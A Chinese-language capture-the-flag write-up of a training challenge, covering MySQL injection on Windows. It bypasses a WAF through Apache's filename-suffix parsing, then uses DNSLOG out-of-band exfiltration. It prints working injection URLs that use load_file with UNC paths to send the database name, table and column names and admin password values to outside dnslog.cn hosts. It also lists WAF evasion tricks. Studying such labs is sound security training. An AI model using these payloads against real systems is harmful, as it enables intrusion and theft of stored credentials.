---
date: "2020-12-17T00:00:00Z"
description: SQL注入 - DNSLOG注入 与 WAF绕过
keywords: SQL注入
tags:
- SQL注入
title: SQL注入 - DNSLOG注入 与 WAF绕过
---

# SQL注入 - DNSLOG注入 与 WAF绕过

> https://hack.zkaq.cn/battle/target?id=9b8ee696eb01591e

## 0x00 

1. 为什么经常说 **完全和运维工作要左移（参考 CI/CD 流程）** ？ 不管说什么， 商业的本质是赚钱， 阻挡赚钱的一切都是异端。
2. 在任何时候 **信息收集** 都很重要。 分析的对象是 **信息** ， 被利用对象的本质是 **疏漏** 。 **`信息分析可以找出这些疏漏`**

**文件解析漏洞**: 任意文件被指定解释器调用。
    1. 指定执行: `php xxx.php`
    2. 默认执行规则: apache`.htaccess`

**WAF绕过**: WAF 的作用是保护业务，而非阻断业务。 因此在设置 WAF 规则的时候， 一定会有各种业务因素导致 WAF 规则盲区。 使用各种方式， 绕过既定 WAF 规则。
    1. 特殊字段出现常用注入字符。
    2. WAF 影响性能
    3. 业务烂但是必须上线。


**mysql on windows** 由于 windows 环境触发的特定利用方式。
    1. UNC / dnslog

## mysql 注入 - dns 注入

### 常规测试

```
http://59.63.200.79:8014/index3.php?id=1%20and%201=2
```

遇到了 WAF。 

![](https://nc0.cdn.zkaq.cn/md/8461/ea837aec83ec521ce8d7f10fd9160328_94867.png)


### 环境分析

打开 **开发者工具** ， 刷新页面，查看服务器返回 `response headers` 头信息

可以看到， windows ， apache


![](https://nc0.cdn.zkaq.cn/md/8461/216cb20d8e79f794226e061add4aa42f_76985.png)



### WAF 绕过 与 apache 文件解析漏洞

**apache 文件解析漏洞**

1. apache 有一个功能特性，将文件名后缀左右向左解析。 
	1. 如果最右侧的后缀不识别，则向左移位。 例如， `index.php.qwe` 。 先识别 `.qwe` 不认识； 再识别 `.php` ， OK。
	2. 如果查找最右侧的文件不存在， 则向左移位。 例如 `1.example.com/index.php/.txt` 。 `.txt` 文件不存在;  再找 `index.php` , ok

**WAF 绕过**

1. 规则绕过， 分析规则， 使用加盐或编码方式等绕过。
	1. 编码： url， hex， base64
	2. 注释：例如mysql `/* xxx */`
	3. 长字符： 11111111111111111=11111111111111111
	4. ...
2. 白名单文件绕过。 即使用平常大家都认为人畜无害的文件类型绕过。
	1. txt

**waf+apache 组合拳**

```
http://59.63.200.79:8014/index3.php/.txt?id=1 and 1=2
```

![](https://nc0.cdn.zkaq.cn/md/8461/f2ea16d795f9912a1e4d53003a7e158e_56825.png)


**mysql on windows**

由于windows 的 UNC 路径特性， 似的 myql on windows 可以使用  dnslog 注入。

### dnslog 测试

```
http://59.63.200.79:8014/index3.php/.txt?id=1%20and%20load_file(%27//1.dl9ewg.dnslog.cn/1.sql%27)
```

![](https://nc0.cdn.zkaq.cn/md/8461/4d189260c08844589dcecae3d55c30b6_14255.png)


通过dnslog 解析记录， 发现， dnslog oob 带外是可以用的。


### flag 查找

```sql

-- sql
-- 1. 查看当前库名
database()


-- 2. 查看当前库的所有表明
select group_concat(table_name) from information_schema.tables

-- 3. 查看指定库、表数据量
select count(*) from <table_name>

-- 4. 查询数据信息


load_file( concat('//', $SQL, '.0cu3h3.dnslog.cn/1.txt') )

```

```bash
## 库名是什么
http://59.63.200.79:8014/index3.php/.txt?id=1 and load_file( concat('//', database(), '.tt.wkhnuu.dnslog.cn/1.txt') )
# result:  mangzhu 

## 多少张表
http://59.63.200.79:8014/index3.php/.txt?id=1 and load_file( concat('//',(select count(table_name) from information_schema.tables WHERE table_schema=database() ), '.tcount.wkhnuu.dnslog.cn/1.txt') )
# result: 2

## 表明是什么
http://59.63.200.79:8014/index3.php/.txt?id=1 and load_file( concat('//',(select table_name from information_schema.tables WHERE table_schema=database() limit 1,1), '.tname.wkhnuu.dnslog.cn/1.txt') )

# result: admin,news

## 查询列
http://59.63.200.79:8014/index3.php/.txt?id=1 and load_file( concat('//',(select hex(group_concat(column_name)) from information_schema.columns WHERE table_schema=database() and table_name='admin' ), '.cls.wkhnuu.dnslog.cn/1.txt') )

# result: 49642c757365726e616d652c70617373776f7264 
## Id,username,password

## 查询字段
http://59.63.200.79:8014/index3.php/.txt?id=1 and load_file( concat('//',( select hex(group_concat(password)) from admin ), '.val.wkhnuu.dnslog.cn/1.txt') )

# result: 31666C616731676F6F6431
## 1flag1good1
```

![](https://nc0.cdn.zkaq.cn/md/8461/7ca4123b1be6e9bb8be053bec6008ce2_96761.png)

**flag: 1flag1good1**

# 0xGG 参考文章

+ [浅谈解析漏洞的利用与防范](https://www.anquanke.com/post/id/219107)
+ [文件解析漏洞总结-Apache](https://blog.csdn.net/wn314/article/details/77074477)
+ [WAF机制及绕过方法总结：注入篇](https://www.freebuf.com/articles/web/229982.html)

